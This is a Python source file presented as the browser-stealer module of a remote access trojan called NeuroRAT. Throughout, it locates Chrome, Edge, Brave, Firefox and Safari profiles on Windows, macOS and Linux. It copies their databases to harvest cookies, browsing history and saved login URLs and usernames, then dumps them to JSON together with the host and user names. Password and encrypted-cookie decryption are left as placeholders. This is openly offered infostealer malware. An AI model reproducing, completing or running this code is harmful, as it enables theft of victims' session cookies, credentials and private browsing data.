#!/usr/bin/env python3
# Browser Data Stealer Module for NeuroRAT
# Author: Mr. Thomas Anderson <iamnobodynothing@gmail.com>
# Description: Extracts cookies, browsing history, passwords, and other browser data

import os
import sys
import json
import time
import shutil
import sqlite3
import logging
import platform
import tempfile
import traceback
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from pathlib import Path

# Try to import encryption libraries
try:
    import Cryptodome.Cipher.AES
    from Cryptodome.Cipher import AES
    CRYPTODOME_AVAILABLE = True
except ImportError:
    CRYPTODOME_AVAILABLE = False

try:
    import pyaes
    PYAES_AVAILABLE = True
except ImportError:
    PYAES_AVAILABLE = False

class BrowserStealer:
    """Module to extract browser cookies, history, passwords and more from various browsers."""
    
    def __init__(self, output_dir: str = None):
        """Initialize the browser stealer module."""
        self.system = platform.system()
        self.output_dir = output_dir or os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
        self.browser_data_dir = os.path.join(self.output_dir, "browser_data")
        
        # Create output directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.browser_data_dir, exist_ok=True)
        
        # Set up logging
        log_file = os.path.join(self.output_dir, "browser_stealer.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("BrowserStealer")
        
        # Define browser paths based on operating system
        self.browser_paths = self._get_browser_paths()
        
        # Track all extracted data
        self.extracted_data = {
            "cookies": {},
            "history": {},
            "bookmarks": {},
            "passwords": {},
            "autofill": {},
            "downloads": {},
            "extensions": {},
            "local_storage": {}
        }
        
        # Check encryption capabilities
        if not CRYPTODOME_AVAILABLE and not PYAES_AVAILABLE:
            self.logger.warning("No encryption libraries available. Password decryption may not work.")

    def _get_browser_paths(self) -> Dict[str, Dict[str, str]]:
        """Get browser profile paths based on the operating system."""
        paths = {}
        user_home = str(Path.home())
        
        if self.system == "Windows":
            app_data = os.path.join(os.environ.get('LOCALAPPDATA', ''), '')
            roaming_app_data = os.path.join(os.environ.get('APPDATA', ''), '')
            
            # Chrome
            paths["chrome"] = {
                "profile_path": os.path.join(app_data, "Google", "Chrome", "User Data"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
            # Firefox
            paths["firefox"] = {
                "profile_path": os.path.join(roaming_app_data, "Mozilla", "Firefox", "Profiles"),
                "cookies": "cookies.sqlite",
                "history": "places.sqlite",
                "bookmarks": "places.sqlite",  # Firefox stores bookmarks in places.sqlite
                "login_data": "logins.json",
                "key4_db": "key4.db"
            }
            
            # Edge
            paths["edge"] = {
                "profile_path": os.path.join(app_data, "Microsoft", "Edge", "User Data"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
            # Brave
            paths["brave"] = {
                "profile_path": os.path.join(app_data, "BraveSoftware", "Brave-Browser", "User Data"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
        elif self.system == "Darwin":  # macOS
            # Chrome
            paths["chrome"] = {
                "profile_path": os.path.join(user_home, "Library", "Application Support", "Google", "Chrome"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
            # Firefox
            paths["firefox"] = {
                "profile_path": os.path.join(user_home, "Library", "Application Support", "Firefox", "Profiles"),
                "cookies": "cookies.sqlite",
                "history": "places.sqlite",
                "bookmarks": "places.sqlite",  # Firefox stores bookmarks in places.sqlite
                "login_data": "logins.json",
                "key4_db": "key4.db"
            }
            
            # Safari
            paths["safari"] = {
                "profile_path": os.path.join(user_home, "Library", "Safari"),
                "cookies": "Cookies.binarycookies",
                "history": "History.db",
                "bookmarks": "Bookmarks.plist"
            }
            
            # Brave
            paths["brave"] = {
                "profile_path": os.path.join(user_home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
        elif self.system == "Linux":
            # Chrome
            paths["chrome"] = {
                "profile_path": os.path.join(user_home, ".config", "google-chrome"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
            
            # Firefox
            paths["firefox"] = {
                "profile_path": os.path.join(user_home, ".mozilla", "firefox"),
                "cookies": "cookies.sqlite",
                "history": "places.sqlite",
                "bookmarks": "places.sqlite",
                "login_data": "logins.json",
                "key4_db": "key4.db"
            }
            
            # Brave
            paths["brave"] = {
                "profile_path": os.path.join(user_home, ".config", "BraveSoftware", "Brave-Browser"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                "cookies": "Cookies",
                "history": "History",
                "bookmarks": "Bookmarks",
                "login_data": "Login Data",
                "web_data": "Web Data",
                "local_state": "Local State"
            }
        
        return paths

    def _get_firefox_profiles(self, profile_path: str) -> List[str]:
        """Get Firefox profile directories."""
        try:
            if not os.path.exists(profile_path):
                return []
            
            profiles = []
            for item in os.listdir(profile_path):
                if os.path.isdir(os.path.join(profile_path, item)) and (".default" in item or "profile" in item.lower()):
                    profiles.append(item)
            return profiles
        except Exception as e:
            self.logger.error(f"Error getting Firefox profiles: {str(e)}")
            return []

    def _copy_db_file(self, src_path: str) -> Optional[str]:
        """Copy a database file to a temporary location to avoid lock issues."""
        try:
            if not os.path.exists(src_path):
                return None
                
            temp_dir = tempfile.gettempdir()
            temp_file = os.path.join(temp_dir, f"tmp_{os.path.basename(src_path)}_{int(time.time())}")
            
            shutil.copy2(src_path, temp_file)
            return temp_file
        except Exception as e:
            self.logger.error(f"Error copying database file {src_path}: {str(e)}")
            return None

    def _extract_chrome_cookies(self, browser_name: str, profile_dir: str) -> List[Dict[str, Any]]:
        """Extract cookies from Chrome-based browsers."""
        cookies = []
        
        try:
            cookie_path = os.path.join(profile_dir, self.browser_paths[browser_name]["cookies"])
            if not os.path.exists(cookie_path):
                return []
                
            # Copy the database to avoid locks
            temp_cookie_path = self._copy_db_file(cookie_path)
            if not temp_cookie_path:
                return []
                
            # Connect to the database
            conn = sqlite3.connect(temp_cookie_path)
            cursor = conn.cursor()
            
            # Query structure can vary slightly between versions
            try:
                cursor.execute(
                    "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc, encrypted_value "
                    "FROM cookies"
                )
                
                for row in cursor.fetchall():
                    host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc, encrypted_value = row
                    
                    # Try to decrypt the value if it's encrypted
                    if encrypted_value and encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                        # Would need encryption key from Local State file to decrypt
                        # This is a placeholder - actual decryption would need a more complex approach
                        decrypted_value = "(encrypted)"
                    else:
                        decrypted_value = value
                        
                    cookie = {
                        "host": host_key,
                        "name": name,
                        "value": decrypted_value,
                        "path": path,
                        "expires": expires_utc,
                        "secure": bool(is_secure),
                        "httponly": bool(is_httponly),
                        "creation": creation_utc
                    }
                    cookies.append(cookie)
                
            except sqlite3.Error as e:
                self.logger.error(f"SQL error in {browser_name} cookies extraction: {str(e)}")
            
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_cookie_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error extracting {browser_name} cookies: {str(e)}")
            
        return cookies

    def _extract_chrome_history(self, browser_name: str, profile_dir: str) -> List[Dict[str, Any]]:
        """Extract browsing history from Chrome-based browsers."""
        history_entries = []
        
        try:
            history_path = os.path.join(profile_dir, self.browser_paths[browser_name]["history"])
            if not os.path.exists(history_path):
                return []
                
            # Copy the database to avoid locks
            temp_history_path = self._copy_db_file(history_path)
            if not temp_history_path:
                return []
                
            # Connect to the database
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute(
                    "SELECT url, title, visit_count, last_visit_time "
                    "FROM urls ORDER BY last_visit_time DESC LIMIT 1000"
                )
                
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit_time = row
                    
                    entry = {
                        "url": url,
                        "title": title,
                        "visit_count": visit_count,
                        "last_visit_time": last_visit_time
                    }
                    history_entries.append(entry)
                
            except sqlite3.Error as e:
                self.logger.error(f"SQL error in {browser_name} history extraction: {str(e)}")
            
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_history_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error extracting {browser_name} history: {str(e)}")
            
        return history_entries

    def _extract_chrome_passwords(self, browser_name: str, profile_dir: str) -> List[Dict[str, Any]]:
        """Extract saved passwords from Chrome-based browsers."""
        passwords = []
        
        try:
            login_data_path = os.path.join(profile_dir, self.browser_paths[browser_name]["login_data"])
            if not os.path.exists(login_data_path):
                return []
                
            # Copy the database to avoid locks
            temp_login_data_path = self._copy_db_file(login_data_path)
            if not temp_login_data_path:
                return []
                
            # Connect to the database
            conn = sqlite3.connect(temp_login_data_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute(
                    "SELECT origin_url, username_value, password_value "
                    "FROM logins"
                )
                
                for row in cursor.fetchall():
                    origin_url, username, password_encrypted = row
                    
                    # Password decryption would require the encryption key from Local State
                    # This is a placeholder - actual decryption would need more complex implementation
                    password = "(encrypted)"
                    
                    entry = {
                        "url": origin_url,
                        "username": username,
                        "password": password
                    }
                    passwords.append(entry)
                
            except sqlite3.Error as e:
                self.logger.error(f"SQL error in {browser_name} password extraction: {str(e)}")
            
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_login_data_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error extracting {browser_name} passwords: {str(e)}")
            
        return passwords

    def _extract_firefox_cookies(self, profile_dir: str) -> List[Dict[str, Any]]:
        """Extract cookies from Firefox."""
        cookies = []
        
        try:
            cookie_path = os.path.join(profile_dir, self.browser_paths["firefox"]["cookies"])
            if not os.path.exists(cookie_path):
                return []
                
            # Copy the database to avoid locks
            temp_cookie_path = self._copy_db_file(cookie_path)
            if not temp_cookie_path:
                return []
                
            # Connect to the database
            conn = sqlite3.connect(temp_cookie_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute(
                    "SELECT host, name, value, path, expiry, isSecure, isHttpOnly "
                    "FROM moz_cookies"
                )
                
                for row in cursor.fetchall():
                    host, name, value, path, expiry, is_secure, is_httponly = row
                    
                    cookie = {
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expiry,
                        "secure": bool(is_secure),
                        "httponly": bool(is_httponly)
                    }
                    cookies.append(cookie)
                
            except sqlite3.Error as e:
                self.logger.error(f"SQL error in Firefox cookies extraction: {str(e)}")
            
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_cookie_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error extracting Firefox cookies: {str(e)}")
            
        return cookies

    def _extract_firefox_history(self, profile_dir: str) -> List[Dict[str, Any]]:
        """Extract browsing history from Firefox."""
        history_entries = []
        
        try:
            history_path = os.path.join(profile_dir, self.browser_paths["firefox"]["history"])
            if not os.path.exists(history_path):
                return []
                
            # Copy the database to avoid locks
            temp_history_path = self._copy_db_file(history_path)
            if not temp_history_path:
                return []
                
            # Connect to the database
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            
            try:
                cursor.execute(
                    "SELECT url, title, visit_count, last_visit_date "
                    "FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000"
                )
                
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit_date = row
                    
                    entry = {
                        "url": url,
                        "title": title,
                        "visit_count": visit_count,
                        "last_visit_time": last_visit_date
                    }
                    history_entries.append(entry)
                
            except sqlite3.Error as e:
                self.logger.error(f"SQL error in Firefox history extraction: {str(e)}")
            
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_history_path)
            except:
                pass
                
        except Exception as e:
            self.logger.error(f"Error extracting Firefox history: {str(e)}")
            
        return history_entries

    def extract_browser_data(self) -> Dict[str, Any]:
        """Extract data from all available browsers."""
        self.logger.info("Starting browser data extraction...")
        
        # Extract data from Chrome browsers
        for browser_name in ["chrome", "edge", "brave"]:
            if browser_name in self.browser_paths:
                browser_path = self.browser_paths[browser_name]["profile_path"]
                
                if os.path.exists(browser_path):
                    self.logger.info(f"Found {browser_name} at {browser_path}")
                    
                    # Process all profiles
                    profiles = self.browser_paths[browser_name].get("profiles", ["Default"])
                    
                    for profile in profiles:
                        profile_dir = os.path.join(browser_path, profile)
                        
                        if os.path.exists(profile_dir):
                            self.logger.info(f"Processing {browser_name} profile: {profile}")
                            
                            # Extract cookies
                            cookies = self._extract_chrome_cookies(browser_name, profile_dir)
                            if cookies:
                                self.extracted_data["cookies"][f"{browser_name}_{profile}"] = cookies
                                
                            # Extract history
                            history = self._extract_chrome_history(browser_name, profile_dir)
                            if history:
                                self.extracted_data["history"][f"{browser_name}_{profile}"] = history
                                
                            # Extract passwords
                            passwords = self._extract_chrome_passwords(browser_name, profile_dir)
                            if passwords:
                                self.extracted_data["passwords"][f"{browser_name}_{profile}"] = passwords
                
        # Extract data from Firefox
        if "firefox" in self.browser_paths:
            firefox_path = self.browser_paths["firefox"]["profile_path"]
            
            if os.path.exists(firefox_path):
                self.logger.info(f"Found Firefox at {firefox_path}")
                
                # Get Firefox profiles
                profiles = self._get_firefox_profiles(firefox_path)
                
                for profile in profiles:
                    profile_dir = os.path.join(firefox_path, profile)
                    
                    if os.path.exists(profile_dir):
                        self.logger.info(f"Processing Firefox profile: {profile}")
                        
                        # Extract cookies
                        cookies = self._extract_firefox_cookies(profile_dir)
                        if cookies:
                            self.extracted_data["cookies"][f"firefox_{profile}"] = cookies
                            
                        # Extract history
                        history = self._extract_firefox_history(profile_dir)
                        if history:
                            self.extracted_data["history"][f"firefox_{profile}"] = history
        
        # Process Safari on macOS
        if self.system == "Darwin" and "safari" in self.browser_paths:
            safari_path = self.browser_paths["safari"]["profile_path"]
            
            if os.path.exists(safari_path):
                self.logger.info(f"Found Safari at {safari_path}")
                # Safari data extraction would go here
                # This requires specialized handling due to Safari's unique data formats
        
        return self.extracted_data

    def save_data(self) -> str:
        """Save extracted data to JSON files."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            result_dir = os.path.join(self.browser_data_dir, f"extraction_{timestamp}")
            os.makedirs(result_dir, exist_ok=True)
            
            # Save each data type to a separate file
            for data_type, data in self.extracted_data.items():
                if data:
                    output_file = os.path.join(result_dir, f"{data_type}.json")
                    with open(output_file, "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=2)
                    
            # Create a summary file
            summary = {
                "timestamp": timestamp,
                "system": self.system,
                "hostname": platform.node(),
                "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
                "summary": {
                    data_type: {browser: len(items) for browser, items in browsers.items()} 
                    for data_type, browsers in self.extracted_data.items() if browsers
                }
            }
            
            summary_file = os.path.join(result_dir, "summary.json")
            with open(summary_file, "w", encoding="utf-8") as f:
                json.dump(summary, f, indent=2)
                
            return result_dir
            
        except Exception as e:
            self.logger.error(f"Error saving data: {str(e)}")
            return None

def main():
    """Main function to run the browser stealer module."""
    try:
        output_dir = sys.argv[1] if len(sys.argv) > 1 else None
        
        browser_stealer = BrowserStealer(output_dir)
        browser_stealer.extract_browser_data()
        result_dir = browser_stealer.save_data()
        
        print(f"Browser data extraction complete. Results saved to: {result_dir}")
        
    except Exception as e:
        print(f"Error: {str(e)}")
        print(traceback.format_exc())

if __name__ == "__main__":
    main() 